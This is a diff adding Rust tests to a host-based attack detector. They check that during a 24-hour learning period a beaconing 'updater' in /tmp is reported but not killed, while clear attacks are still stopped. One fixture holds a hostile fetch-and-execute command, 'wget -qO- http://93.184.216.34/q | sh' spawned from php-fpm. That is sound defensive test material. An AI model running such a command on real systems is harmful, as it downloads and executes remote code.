@@ -186,3 +186,80 @@ fn the_agents_own_lookups_are_never_judged_and_the_same_command_from_anyone_else
     assert_eq!(cases[0]["parent"], "cmd.exe");
     assert_eq!(watcher.hands.as_ref().unwrap().killed, [800]);
 }
+
+/// A program in a temporary folder that calls the same internet address on an odd port every half minute: nothing
+/// names it an attack, but its score reaches the hostile level.
+fn beacon(watcher: &mut Watcher<Machine, Recorded>, from: f64, looks: u32) -> Vec<Value> {
+    let mut last = Vec::new();
+    for number in 0..looks {
+        watcher.sensor.conns = vec![Conn::new(300, 41000 + number, "93.184.216.34", 8444, false, "10.0.0.5")];
+        let cases = look(watcher, from + 30.0 * number as f64, &[]);
+        if !cases.is_empty() {
+            last = cases;
+        }
+    }
+    last
+}
+
+fn with_beacon(folder: &std::path::Path, hours: f64) -> Watcher<Machine, Recorded> {
+    let _ = std::fs::remove_dir_all(folder);
+    std::fs::create_dir_all(folder).unwrap();
+    let program = Proc { pid: 300, ppid: 1, name: "updater".into(), path: "/tmp/x/updater".into(), started: 7 };
+    let mut watcher = Watcher::new(Machine { procs: vec![program], ..Machine::default() }, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
+    watcher.own.insert(1_000_000_000);
+    watcher.keep_in(folder, false);
+    watcher.settle_in(hours, true, T);
+    watcher
+}
+
+#[test]
+fn a_fresh_install_leaves_a_merely_suspicious_program_for_its_owner_and_still_stops_an_attack() {
+    let folder = std::env::temp_dir().join(format!("garrett-settle-test-{}", std::process::id()));
+    // With no settling in, the program is ended as soon as its score says hostile.
+    let mut hasty = with_beacon(&folder, 0.0);
+    let cases = beacon(&mut hasty, T, 8);
+    assert_eq!(cases[0]["level"], "HOSTILE", "{cases:?}");
+    assert_eq!(hasty.hands.as_ref().unwrap().killed, [300]);
+
+    // Settling in: reported, said to be left running, not touched.
+    let mut watcher = with_beacon(&folder, 24.0);
+    assert!(watcher.settling(T).0 > 23.0 * 3600.0);
+    let cases = beacon(&mut watcher, T, 8);
+    assert_eq!(cases[0]["level"], "HOSTILE", "{cases:?}");
+    assert_eq!(cases[0]["held"], "learning");
+    assert!(cases[0].get("actions").is_none());
+    assert!(watcher.hands.as_ref().unwrap().killed.is_empty());
+    assert_eq!(watcher.settling(T + 600.0).1, 1);
+    let key = cases[0]["key"].as_str().unwrap().to_string();
+
+    // The day is over and the agent has been restarted: that program is still the owner's to judge.
+    let program = Proc { pid: 300, ppid: 1, name: "updater".into(), path: "/tmp/x/updater".into(), started: 7 };
+    let mut later = Watcher::new(Machine { procs: vec![program], ..Machine::default() }, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
+    later.own.insert(1_000_000_000);
+    later.keep_in(&folder, false);
+    later.settle_in(24.0, false, T + 90_000.0);
+    assert_eq!(later.settling(T + 90_000.0), (0.0, 1));
+    let cases = beacon(&mut later, T + 90_000.0, 8);
+    assert_eq!(cases[0]["held"], "here first", "{cases:?}");
+    assert!(later.hands.as_ref().unwrap().killed.is_empty());
+    // Until the owner says it was an attack.
+    later.set_confirmed(&serde_json::json!([key]));
+    beacon(&mut later, T + 91_000.0, 2);
+    assert_eq!(later.hands.as_ref().unwrap().killed, [300]);
+
+    // And through all of it, what is plainly an attack is stopped from the first second.
+    let (mut watcher, _) = attacked(Mode::Kill);
+    assert_eq!(watcher.hands.as_ref().unwrap().killed, [200]);
+    let settle = std::env::temp_dir().join(format!("garrett-settle-test-b-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&settle);
+    std::fs::create_dir_all(&settle).unwrap();
+    watcher.keep_in(&settle, false);
+    watcher.settle_in(24.0, true, T + 2.0);
+    let shell = Proc { pid: 201, ppid: 101, name: "sh".into(), path: "/usr/bin/dash".into(), started: 11 };
+    let snap = Snap { proc: shell.clone(), cmdline: "sh -c wget -qO- http://93.184.216.34/q | sh".into(), parent: "php-fpm8.3".into() };
+    watcher.sensor.procs.push(shell);
+    watcher.on_exec(&snap, T + 3.0);
+    assert_eq!(watcher.hands.as_ref().unwrap().killed, [200, 201]);
+    let _ = std::fs::remove_dir_all(&folder);
+    let _ = std::fs::remove_dir_all(&settle);
+}
